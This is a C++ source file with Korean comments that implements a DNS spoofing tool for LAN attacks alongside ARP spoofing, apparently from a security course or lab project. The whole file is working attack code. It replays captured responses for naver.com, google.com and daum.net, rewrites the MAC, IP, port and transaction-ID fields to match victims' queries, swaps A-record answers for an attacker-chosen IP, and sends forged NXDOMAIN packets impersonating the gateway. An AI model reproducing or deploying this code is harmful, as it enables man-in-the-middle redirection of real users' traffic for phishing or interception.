#include "dns_spoofer.hpp"
#include "arp_spoof.hpp"
#include "network_utils.hpp"
#include <pcap.h>
#include <cstring>
#include <cstdlib>
#include <iostream>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <unistd.h>
#include <cctype>
#include <netinet/udp.h>
#include <netinet/if_ether.h>

using namespace std;
using namespace NetworkUtils;

#define DNS_PORT 53


DnsSpoofer::DnsSpoofer()
{
}

DnsSpoofer::~DnsSpoofer()
{
}

// PCAP 내의 Packet을 읽어 응답형태의 DNS 패킷을 저장
bool DnsSpoofer::load_dns_response_template(const string& filename, vector<vector<uint8_t>>& templates) 
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap_handle = pcap_open_offline(filename.c_str(), errbuf);
    if (!pcap_handle) 
    {
        cerr << "pcap 파일 열기 실패: " << errbuf << endl;
        return false;
    }
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;
    // pcap 파일 하나씩 읽음
    while ((res = pcap_next_ex(pcap_handle, &header, &packet)) >= 0) 
    {
        // 시간 초과(res == 0) 또는 패킷 길이가 이더넷 헤더보다 짧은 경우 SKIP
        if (res == 0 || header->caplen < 14) 
        {
            continue;
        }
        // 패킷 Ether Type 확인 
        const struct ether_header* eth_hdr = reinterpret_cast<const struct ether_header*>(packet);
        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP)
        {
            continue;
        }
        
        // IP 헤더 = UDP 패킷 확인
        const struct ip* ip_hdr = reinterpret_cast<const struct ip*>(packet + 14);
        int ip_header_len = ip_hdr->ip_hl * 4;
        if (ip_hdr->ip_p != IPPROTO_UDP)
        {
            continue;
        }

        // UDP 헤더 = SRC 포트 확인 (응답패킷 확인용)
        const struct udphdr* udp_hdr = reinterpret_cast<const struct udphdr*>(packet + 14 + ip_header_len);
        if (ntohs(udp_hdr->uh_sport) != DNS_PORT)
        {
            continue;
        }
        // 전체 패킷을 템플릿 리스트에 저장
        templates.emplace_back(packet, packet + header->caplen);
    }
    pcap_close(pcap_handle);
    if (!templates.empty()) 
    {
        cout << filename << " 로부터 DNS 응답 템플릿 " << templates.size() << "개 로드 완료" << endl;
        return true;
    } 
    else 
    {
        cerr << "DNS 응답 패킷 찾지 못함: " << filename << endl;
        return false;
    }
}

// 템플릿리소스를 가져와서 캐시 형태로 저장(빠른 로드용)
void DnsSpoofer::cache_template_packet(const vector<uint8_t>& packet, const string& domain)
{
    const int eth_len = 14; 
    // IP 헤더
    const struct ip* ip_hdr = reinterpret_cast<const struct ip*>(packet.data() + eth_len);
    int ip_header_len = ip_hdr->ip_hl * 4;
    // UDP 헤더
    const struct udphdr* udp_hdr = reinterpret_cast<const struct udphdr*>(packet.data() + eth_len + ip_header_len);
    // DNS 출발지 포트가 DNS_PORT인 경우 응답으로 간주.
    bool is_response = (ntohs(udp_hdr->uh_sport) == DNS_PORT);
    
    if (!is_response) {
        cout << "경고: 응답 패킷이 아닌 패킷을 캐시에 저장하지 않음" << endl;
        return;
    }
    
    DnsTemplateCache cache_entry;
    cache_entry.packet = packet;
    // DNS 데이터는 이더넷, IP, UDP 헤더 이후부터 시작함.
    const uint8_t* dns_data = packet.data() + eth_len + ip_header_len + sizeof(struct udphdr);
    // DNS 헤더는 12바이트이므로 그 이후가 질문 섹션
    const uint8_t* qptr = dns_data + 12;
    // 질문 섹션을 순회하며 도메인명 부분을 건너뜀 (인자로 받아옴)
    while (*qptr != 0 && (qptr - dns_data) < (packet.size() - (eth_len + ip_header_len + sizeof(struct udphdr)))) {
        qptr += (*qptr) + 1;
    }
    qptr++; // null 바이트
    // 그 다음 2바이트가 질문 타입(qtype)
    cache_entry.qtype = ntohs(*(uint16_t*)qptr);
    cache_entry.is_response = is_response;
    
    // 도메인 이름을 소문자로 변환하여 정규화
    string normalized_domain = domain;
    for (auto &c : normalized_domain) {
        c = tolower(c);
    }
    
    // 해당 도메인 이름을 키로 캐시 맵에 추가
    template_cache[normalized_domain].push_back(move(cache_entry));
}

// 템플릿 초기화 및 캐시에 저장하도록 하는 전체 함수
bool DnsSpoofer::initialize_templates(const string& naver_path,
                                       const string& google_path,
                                       const string& daum_path)
{
    bool success = true;
    vector<vector<uint8_t>> naver_templates, google_templates, daum_templates;
    if (!load_dns_response_template(naver_path, naver_templates))
        success = false;
    if (!load_dns_response_template(google_path, google_templates))
        success = false;
    if (!load_dns_response_template(daum_path, daum_templates))
        success = false;
    
    // 각 도메인별로 캐시에 템플릿을 저장
    for (const auto& packet : naver_templates)
        cache_template_packet(packet, "www.naver.com");
    for (const auto& packet : google_templates)
        cache_template_packet(packet, "www.google.com");
    for (const auto& packet : daum_templates)
        cache_template_packet(packet, "www.daum.net");
    
    cout << "DNS 템플릿 캐시 초기화 완료: " << template_cache.size() << "개 도메인" << endl;
    return success;
}

// 도메인 포메팅
string DnsSpoofer::extract_domain_name(const uint8_t* dns_data, size_t dns_len)
{
    string domain;
    size_t pos = 12; // DNS 헤더 길이
    // 도메인 이름을 파싱: 각 레이블의 길이를 읽고, 해당 수 만큼 문자 읽기
    while (pos < dns_len) {
        uint8_t len = dns_data[pos];
        if (len == 0)
            break;
        if (!domain.empty())
            domain.push_back('.'); // 레이블 사이에 점을 추가
        pos++;
        for (int i = 0; i < len && pos < dns_len; i++, pos++) {
            domain.push_back(dns_data[pos]);
        }
    }
    return domain;
}


void DnsSpoofer::send_spoof_response(pcap_t* handle, 
                                      const uint8_t* orig_packet, 
                                      size_t orig_packet_len,
                                      const uint8_t* attacker_mac,
                                      const uint8_t* gateway_ip,
                                      const string& domain,
                                      const vector<unique_ptr<SpoofTarget>>& targets)
{
    const int eth_len = 14;
    // 원본 IP, UDP, DNS 헤더를 추출
    const struct ip* orig_ip = reinterpret_cast<const struct ip*>(orig_packet + eth_len);
    int ip_header_len = orig_ip->ip_hl * 4;
    const struct udphdr* orig_udp = reinterpret_cast<const struct udphdr*>(orig_packet + eth_len + ip_header_len);
    const dns_hdr* orig_dns = reinterpret_cast<const dns_hdr*>(orig_packet + eth_len + ip_header_len + sizeof(struct udphdr));
    
    // DNS 질문 데이터의 시작 위치와 길이를 계산
    const uint8_t* query_data = orig_packet + eth_len + ip_header_len + sizeof(struct udphdr);
    size_t query_len = orig_packet_len - (eth_len + ip_header_len + sizeof(struct udphdr));
    
    // DNS 도메인 이름 및 질문 타입
    uint8_t* qptr = const_cast<uint8_t*>(query_data) + 12;
    while (*qptr != 0 && (qptr - query_data) < query_len)
    {
        qptr += (*qptr) + 1;
    }
    qptr++; // null 바이트
    // 질문 타입 추출 (2바이트)
    uint16_t qtype = ntohs(*(uint16_t*)qptr);
    
    // 입력 도메인을 소문자로 정규화
    string normalized_domain = domain;
    for (auto &c : normalized_domain)
        c = tolower(c);
    
    // 해당 도메인에 대한 템플릿이 캐시에 존재하는지 확인
    if (template_cache.find(normalized_domain) == template_cache.end()) 
    {
        cerr << "[" << domain << "] DNS 템플릿 없음. 전송 생략.\n";
        return;
    }
    
    const auto& templates = template_cache[normalized_domain];
    bool template_found = false;
    
    uint8_t requester_ip[4];
    memcpy(requester_ip, &orig_ip->ip_src, 4);
    uint8_t requester_mac[6] = {0};
    bool found_target = false;
    // 스푸핑 대상의 MAC 주소
    for (const auto& target : targets) 
    {
        if (ip_equals(requester_ip, target->get_ip())) 
        {
            memcpy(requester_mac, target->get_mac(), 6);
            found_target = true;
            break;
        }
    }
    
    if (!found_target) 
    {
        cerr << "[DNS 응답] 대상 MAC 찾기 실패. 전송 생략.\n";
        return;
    }
    
    // 템플릿들 중, 질문 타입과 매칭되는 템플릿 확인
    for (const auto& cache_entry : templates) 
    {
        if (qtype == cache_entry.qtype || (qtype == 1 && cache_entry.qtype == 1) || (qtype == 65 && cache_entry.qtype == 65))
        {
            template_found = true;
            // 선택된 템플릿 패킷을 로컬 버퍼에 복사
            vector<uint8_t> local_packet_buffer(cache_entry.packet);
            size_t spoof_packet_size = local_packet_buffer.size();
            
            // Ethernet 헤더 공격자 MAC을 출발지로, 대상 MAC을 목적지로 설정
            struct ether_header* eth_resp = reinterpret_cast<struct ether_header*>(local_packet_buffer.data());
            memcpy(eth_resp->ether_shost, attacker_mac, 6);
            memcpy(eth_resp->ether_dhost, requester_mac, 6);
            
            //  원본 IP 헤더를 참조하여 출발지와 목적지를 스왑
            struct ip* ip_resp = reinterpret_cast<struct ip*>(local_packet_buffer.data() + eth_len);
            ip_resp->ip_src = orig_ip->ip_dst;
            ip_resp->ip_dst = orig_ip->ip_src;
            ip_resp->ip_id = htons(rand() % 65536);
            ip_resp->ip_sum = 0;
            uint16_t* ip_words = reinterpret_cast<uint16_t*>(ip_resp);
            unsigned long ip_sum = 0;
            for (int i = 0; i < ip_resp->ip_hl * 2; i++)
                ip_sum += ntohs(ip_words[i]);
            while (ip_sum >> 16)
                ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
            ip_resp->ip_sum = htons(~ip_sum);
            
            // UDP 헤더 포트 번호를 스왑
            struct udphdr* udp_resp = reinterpret_cast<struct udphdr*>(local_packet_buffer.data() + eth_len + ip_resp->ip_hl * 4);
            udp_resp->uh_sport = orig_udp->uh_dport;
            udp_resp->uh_dport = orig_udp->uh_sport;
            udp_resp->uh_sum = 0;
            
            // 트랜잭션 ID를 원본과 일치
            dns_hdr* dns_resp = reinterpret_cast<dns_hdr*>(local_packet_buffer.data() + eth_len + ip_resp->ip_hl * 4 + sizeof(struct udphdr));
            dns_resp->id = orig_dns->id;
            
            // 스푸핑 IP 주소 설정
            uint32_t new_ip;
            inet_pton(AF_INET, spoof_ip.c_str(), &new_ip);
            
            // DNS 응답 데이터 부분에서 IP 주소를 스푸핑 IP로 대체
            uint8_t* dns_data = reinterpret_cast<uint8_t*>(dns_resp);
            size_t dns_len = spoof_packet_size - (eth_len + ip_resp->ip_hl * 4 + sizeof(struct udphdr));
            uint8_t* current = dns_data + sizeof(dns_hdr);
            while (*current != 0 && (current - dns_data) < dns_len)
                current += (*current) + 1;
            current += 5;
            for (int i = 0; i < ntohs(dns_resp->ancount); i++) 
            {
                if (current[0] == 0xC0)
                    current += 2;
                else {
                    while (*current != 0 && (current - dns_data) < dns_len)
                        current += (*current) + 1;
                    current++;
                }
                uint16_t answer_type = (current[0] << 8) | current[1];
                uint16_t rdlength = (current[8] << 8) | current[9];
                size_t offset = (current - dns_data) + 10;
                if (answer_type == 1 && rdlength == 4 && offset + 4 <= dns_len)
                    memcpy(dns_data + offset, &new_ip, 4);
                current += 10 + rdlength;
            }
            
            // 전송: 수정된 스푸핑 응답 패킷을 전송
            if (pcap_sendpacket(handle, local_packet_buffer.data(), spoof_packet_size) != 0) 
            {
                cerr << "DNS 스푸핑 응답 전송 실패: " << pcap_geterr(handle) << endl;
            } else {
                cout << "[DNS 응답] 전송 완료 (" << domain << ", 타입: " << cache_entry.qtype << ")" << endl;
            }
            return;
        }
    }
    if (!template_found)
        cout << "[" << domain << "] 요청된 레코드 타입(" << qtype << ")에 맞는 템플릿을 찾지 못했습니다.\n";
}


void DnsSpoofer::send_recovery_responses(pcap_t* handle,
                                          const uint8_t* attacker_mac,
                                          const uint8_t* gateway_ip,
                                          const vector<unique_ptr<SpoofTarget>>& targets)
{
    cout << "DNS 스푸핑 복구 시작 NXDOMAIN 패킷..." << endl;

    // recovery_domains 리스트에 있는 각 도메인에 대해 복구 패킷 전송
    for (const auto& domain : recovery_domains) {
        // 도메인을 소문자로 정규화
        string normalized_domain = domain;
        for (auto &c : normalized_domain) {
            c = tolower(c);
        }
        
        // 캐시에서 해당 도메인의 템플릿이 있는지 확인
        if (template_cache.find(normalized_domain) == template_cache.end()) {
            cerr << "[" << domain << "] DNS 템플릿 없음. 복구 생략.\n";
            continue;
        }
        bool found_template = false;
        // 저장된 템플릿 중 A 레코드(타입 1) 응답을 선택
        for (const auto& cache_entry : template_cache[normalized_domain]) {
            if (cache_entry.qtype == 1 && cache_entry.is_response) {
                found_template = true;
                // 각 스푸핑 대상에 대해 NXDOMAIN 패킷을 전송
                for (const auto& target : targets) {
                    vector<uint8_t> nxdomain_packet = cache_entry.packet;
                    const int eth_len = 14;

                    // Ethernet 헤더에서 공격자/대상 MAC 주소를 설정
                    struct ether_header* eth_nx = reinterpret_cast<struct ether_header*>(nxdomain_packet.data());
                    memcpy(eth_nx->ether_shost, attacker_mac, 6);
                    memcpy(eth_nx->ether_dhost, target->get_mac(), 6);

                    // IP 헤더를 수정하여, 게이트웨이 IP를 출발지, 대상의 IP를 목적지로 설정하고 TTL을 0으로 지정
                    struct ip* ip_nx = reinterpret_cast<struct ip*>(nxdomain_packet.data() + eth_len);
                    int ip_header_len = ip_nx->ip_hl * 4;
                    memcpy(&ip_nx->ip_src, gateway_ip, 4);
                    memcpy(&ip_nx->ip_dst, target->get_ip(), 4);
                    ip_nx->ip_ttl = 0; // TTL 
                    ip_nx->ip_id = htons(rand() % 65536);
                    ip_nx->ip_sum = 0;
                    uint16_t* ip_words = reinterpret_cast<uint16_t*>(ip_nx);
                    unsigned long ip_sum = 0;
                    for (int i = 0; i < ip_header_len/2; i++) {
                        ip_sum += ntohs(ip_words[i]);
                    }
                    while (ip_sum >> 16)
                        ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
                    ip_nx->ip_sum = htons(~ip_sum);
                    
                    // UDP 헤더 및 DNS 헤더 설정 (재전송을 위한 랜덤 ID 및 NXDOMAIN 플래그 설정)
                    struct udphdr* udp_nx = reinterpret_cast<struct udphdr*>(nxdomain_packet.data() + eth_len + ip_header_len);
                    dns_hdr* dns_nx = reinterpret_cast<dns_hdr*>(nxdomain_packet.data() + eth_len + ip_header_len + sizeof(struct udphdr));
                    dns_nx->id = htons(rand() % 65535);
                    uint16_t flags = ntohs(dns_nx->flags);
                    flags = (flags & 0xFFF0) | 0x0003; // RCODE 3: NXDOMAIN
                    dns_nx->flags = htons(flags);
                    dns_nx->ancount = 0; // NXDOMAIN 응답은 정답 섹션이 없음.
                    
                    // NXDOMAIN 패킷 3회 전송
                    for (int i = 0; i < 3; i++) {
                        if (pcap_sendpacket(handle, nxdomain_packet.data(), nxdomain_packet.size()) != 0)
                            cerr << "NXDOMAIN 패킷 전송 실패: " << pcap_geterr(handle) << endl;
                        else
                            cout << "NXDOMAIN 패킷 전송 성공 " << domain 
                                 << " (대상: " << target->get_ip_str() << ")" << endl;
                        usleep(10000);
                    }
                    usleep(50000);
                }
                break;
            }
        }
        if (!found_template)
            cerr << "[" << domain << "] A 레코드 템플릿을 찾지 못했습니다. 복구 생략.\n";
    }
    cout << "DNS 스푸핑 복구 패킷 전송 완료" << endl;
}
